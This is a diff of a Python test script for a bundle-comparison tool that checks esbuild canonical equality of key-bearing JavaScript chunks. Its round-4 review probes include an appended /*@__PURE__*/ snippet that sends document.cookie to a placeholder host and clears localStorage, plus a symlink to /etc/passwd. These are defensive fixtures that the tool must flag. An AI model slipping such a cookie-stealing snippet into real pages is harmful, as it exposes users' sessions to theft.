@@ -9,7 +9,8 @@ the pinned binary from fetch-esbuild-0.27.4.sh. The bundles are extracted with t
 candidate-web-check.py, which must sit beside this file.
 
 Cases:
-- Usage: a binary other than the pinned esbuild is refused.
+- Usage: a binary other than the pinned esbuild, and the pinned binary without its execute bit, are refused. A relative
+  --esbuild path runs the file that was checked (round 4, D2).
 - On copies of tree B:
   - a simulated key change (another synthetic key, the key-bearing chunks renamed, references and CACHE_VERSION
     updated) is IDENTICAL;
@@ -17,10 +18,13 @@ Cases:
   - a tree without a key is invalid input;
   - colliding normalized names are refused: two hashed chunks, or a file literally named like a normalized one,
     whichever of the two sorts first;
-  - a key-bearing text file that is not JavaScript is compared byte for byte (a whitespace change is DIFFERENT).
+  - a key-bearing text file that is not JavaScript is compared byte for byte (a whitespace change is DIFFERENT);
+  - a changed file or directory mode is DIFFERENT, and a symbolic link in the tree is invalid input.
 - With C, on the real key-bearing chunk (assets/env-<H>.js):
   - the real pair is IDENTICAL through esbuild canonical equality;
-  - the review probes are DIFFERENT: two import names swapped, and an exported name renamed;
+  - the review probes are DIFFERENT:
+    - round 3: two import names swapped, and an exported name renamed;
+    - round 4: an appended /*@__PURE__*/ call, and an unused import specifier;
   - a real non-key chunk replaced by its own esbuild-minified form is DIFFERENT, because only key-bearing chunks get the
     canonical comparison;
   - a string changed, a boolean flipped (DEV:!1 -> DEV:!0) or an unterminated string in the real chunk is DIFFERENT;
@@ -30,7 +34,9 @@ Cases:
   - each other pair changes one invariant and is DIFFERENT: merged locals, code appended on one side, an identifier
     turned into a literal, a free global renamed, a shorthand key, a class member, `in` vs `of`, a regular expression
     after `)`, a statement boundary (return + newline), a property name, swapped import names, an exported name,
-    input esbuild rejects on one side, and two different inputs it rejects on both sides.
+    input esbuild rejects on one side, and two different inputs it rejects on both sides; and, from round 4, a
+    /*@__PURE__*/ call, a /*#__PURE__*/ call, a call to a /*@__NO_SIDE_EFFECTS__*/ function (declaration and arrow
+    form), an unused import name, and an unused added import specifier.
 The key values in the artifacts are never printed, and the test checks the tool's output for them.
 """
 import argparse
@@ -76,9 +82,9 @@ def tree_key(root):
     return None
 
 
-def run(a, b, want_rc, want, label, secrets=(), esbuild=None):
+def run(a, b, want_rc, want, label, secrets=(), esbuild=None, cwd=None):
     p = subprocess.run([sys.executable, "-I", TOOL, "--a-dir", a, "--b-dir", b, "--esbuild", esbuild or ESBUILD],
-                       capture_output=True, text=True)
+                       capture_output=True, text=True, cwd=cwd)
     out = p.stdout + p.stderr
     ok = p.returncode == want_rc and all(w in out for w in want) and not any(s and s in out for s in secrets)
     results.append(ok)
@@ -171,6 +177,14 @@ SNIPPETS = [
     ("an exported name", "const zr3=1;export{zr3 as ab};", "const zr3=1;export{zr3 as cd};", 1),
     ("input esbuild rejects", "function zr4(){return 1}", "function zr4({return 1}", 1),
     ("two different inputs esbuild rejects (no match through failure)", "function zr5({return 1}", "function zr5({return 2}", 1),
+    ("an appended /*@__PURE__*/ call (round 4, D1a)", "", "/*@__PURE__*/alert(1);", 1),
+    ("an appended /*#__PURE__*/ call", "", "/*#__PURE__*/alert(1);", 1),
+    ("a call to a /*@__NO_SIDE_EFFECTS__*/ function", "/*@__NO_SIDE_EFFECTS__*/function zs1(){alert(1)}export{zs1 as zs1x};",
+     "/*@__NO_SIDE_EFFECTS__*/function zs1(){alert(1)}zs1();export{zs1 as zs1x};", 1),
+    ("a call to a /*@__NO_SIDE_EFFECTS__*/ arrow", "const zs2=/*@__NO_SIDE_EFFECTS__*/()=>alert(1);export{zs2 as zs2x};",
+     "const zs2=/*@__NO_SIDE_EFFECTS__*/()=>alert(1);zs2();export{zs2 as zs2x};", 1),
+    ("an unused import name (round 4, D1b)", 'import{a as zb}from"./zm.js";', 'import{zzz as zb}from"./zm.js";', 1),
+    ("an unused import specifier added", 'import{a}from"./zm.js";', 'import{a,zzz}from"./zm.js";', 1),
 ]
 
 
@@ -194,6 +208,10 @@ def main():
         with open(fake, "ab") as fh:
             fh.write(b"\0")
         run(a, b, 2, ["not the pinned esbuild 0.27.4"], "a binary other than the pinned esbuild is refused (usage)", esbuild=fake)
+        noexec = os.path.join(tmp, "esbuild-noexec")
+        shutil.copy(ESBUILD, noexec)
+        os.chmod(noexec, 0o644)
+        run(a, b, 2, ["is not executable"], "the pinned esbuild without its execute bit is refused (usage)", esbuild=noexec)
 
         run(a, b, 0, ["IDENTICAL"], "the two real candidate bundles (same source, same key) are identical", (ka, kb))
 
@@ -264,13 +282,36 @@ def main():
         open(os.path.join(c9, "key-note.txt"), "w").write('"SyntheticKeyZZZZ9999" ')
         run(a9, c9, 1, ["DIFFERENT", "key-note.txt"], "a key-bearing non-JavaScript file differing only in whitespace is DIFFERENT", (ka,))
 
+        def mode_change(d):
+            os.chmod(os.path.join(d, "index.html"), 0o600)
+        run(a, variant("d10", mode_change), 1, ["DIFFERENT", "index.html"], "a changed file mode is DIFFERENT")
+
+        def key_mode_change(d):
+            env = env_chunk(d)
+            os.chmod(env, 0o600)
+        run(a, variant("d11", key_mode_change), 1, ["DIFFERENT", "env-<H>.js"], "a changed mode on the key-bearing chunk is DIFFERENT")
+
+        def link(d):
+            os.symlink("/etc/passwd", os.path.join(d, "assets", "zz-link.js"))
+        run(a, variant("d12", link), 1, ["invalid input", "not a regular file or directory"], "a symbolic link in the tree is invalid input")
+
+        def dir_mode(d):
+            os.chmod(os.path.join(d, "assets"), 0o700)
+        run(a, variant("d13", dir_mode), 1, ["DIFFERENT", "dir:assets"], "a changed directory mode is DIFFERENT")
+
         if args.c_tar:
             n = os.path.join(tmp, "new")
             extract(args.c_tar, n)
             kn = tree_key(n)
             secrets = (ka, kn)
-            run(a, n, 0, ["IDENTICAL", "key-bearing assets/env-<H>.js: equal after esbuild 0.27.4 minification of both"],
+            run(a, n, 0, ["IDENTICAL", "key-bearing assets/env-<H>.js: equal after esbuild 0.27.4 canonical printing of both"],
                 "the real candidate with another key: IDENTICAL through esbuild canonical equality of the key-bearing chunk", secrets)
+            reldir = os.path.join(tmp, "reldir")
+            os.makedirs(reldir)
+            shutil.copy(ESBUILD, os.path.join(reldir, "esbuild-copy"))
+            os.chmod(os.path.join(reldir, "esbuild-copy"), 0o755)
+            run(a, n, 0, ["IDENTICAL", "equal after esbuild 0.27.4 canonical printing"],
+                "a relative --esbuild path runs the checked file (round 4, D2)", secrets, esbuild="./esbuild-copy", cwd=reldir)
 
             def env_mutation(name, fn):
                 d = os.path.join(tmp, name)
@@ -287,6 +328,9 @@ def main():
                 ("r3", lambda t: t.replace('"streets-v2"', '"streets-v3"', 1), "a string changed"),
                 ("r4", lambda t: t.replace("DEV:!1", "DEV:!0", 1), "a boolean flipped (DEV:!1 -> DEV:!0)"),
                 ("r5", lambda t: t + "'unterminated", "an unterminated string (esbuild rejects it)"),
+                ("r8", lambda t: t + '\n/*@__PURE__*/(()=>{fetch("https://x.invalid/?c="+encodeURIComponent(document.cookie));'
+                                     'localStorage.clear()})("pad");', "an appended /*@__PURE__*/ call that reads cookies (review probe, round 4)"),
+                ("r9", lambda t: t.replace("import{", "import{zzq,", 1), "an unused import specifier added (review probe, round 4)"),
             ]:
                 run(a, env_mutation(name, fn), 1, ["DIFFERENT", "env-<H>.js"], f"the real key-bearing chunk with {label} is DIFFERENT", secrets)
 
